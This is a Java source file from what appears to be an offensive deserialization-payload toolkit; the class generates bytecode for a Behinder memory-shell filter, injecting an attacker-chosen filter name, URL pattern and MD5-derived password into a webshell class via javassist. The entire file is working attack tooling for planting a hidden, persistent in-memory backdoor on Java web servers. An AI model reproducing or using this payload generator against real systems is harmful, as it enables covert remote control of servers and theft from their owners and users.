package org.erosion2020.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import org.erosion2020.memshell.BehinderFilter;
import org.erosion2020.payloads.annotation.Authors;
import org.erosion2020.util.CommandCursor;
import org.erosion2020.util.Gadgets;

import java.util.*;

@SuppressWarnings({"unchecked"})
@Authors({ Authors.EROSION_2020 })
public class Behinder implements ObjectPayload<Object> {

    private static Map<String, Class> mem_cache = new HashMap<>();

    static {
        mem_cache.put("filter", BehinderFilter.class);
    }

    @Override
    public Object getObject(String command) throws Exception {
        // init params
        CommandCursor commandCursor = new CommandCursor(command);
        String mem_type = commandCursor.next();
        String filter_name = commandCursor.next();
        String pattern = commandCursor.next();
        String md5 = Gadgets.md5(commandCursor.next());
        String password = md5.substring(0, 16);

        // init payload
        ClassPool rememberMe = ClassPool.getDefault();
        CtClass behinderFilter = rememberMe.get(mem_cache.get(mem_type).getName());
        // create params
        behinderFilter.makeClassInitializer().insertBefore(
                "filter_name = \""+filter_name+"\";" +
                        "pattern = \"" +pattern + "\";" +
                        "password = \""+password+"\";"
        );
        return behinderFilter.toBytecode();
    }

}



